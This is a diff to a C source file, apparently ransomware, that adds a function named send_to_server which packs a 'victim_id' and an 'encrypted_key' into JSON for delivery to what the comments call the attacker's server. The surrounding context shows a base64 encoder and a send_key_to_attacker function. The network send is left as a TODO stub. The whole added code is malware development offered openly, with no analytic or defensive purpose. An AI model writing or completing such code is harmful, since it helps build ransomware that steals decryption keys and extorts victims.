@@ -124,6 +124,37 @@ static int base64_encode(const unsigned char *bin_input,
     return 0;
 }
 
+/* Send victim data to attacker's server */
+static int send_to_server(const char *victim_id, const char *encrypted_key) {
+    
+    // validate inputs
+    if (!victim_id || !encrypted_key) {
+        return -1;
+    }
+    
+    // calculate how much space we need for JSON
+    size_t json_size = strlen("{\"victim_id\":\"\", \"encrypted_key\":\"\"}") +
+                       strlen(victim_id) + strlen(encrypted_key) + 1;
+    
+    // allocate memory
+    char *json = malloc(json_size);
+    if (!json) {
+        return -1;
+    }
+    
+    // create the JSON string
+    snprintf(json, json_size,
+             "{\"victim_id\":\"%s\", \"encrypted_key\":\"%s\"}",
+             victim_id, encrypted_key);
+    
+    // TODO: send json to attacker's server with api request
+    
+    // cleanup
+    free(json);
+    
+    return 0;  // TODO: return actual result from api request
+}
+
 /* Send encrypted key to attacker's server */
 static int send_key_to_attacker(const char *key_file) {
 
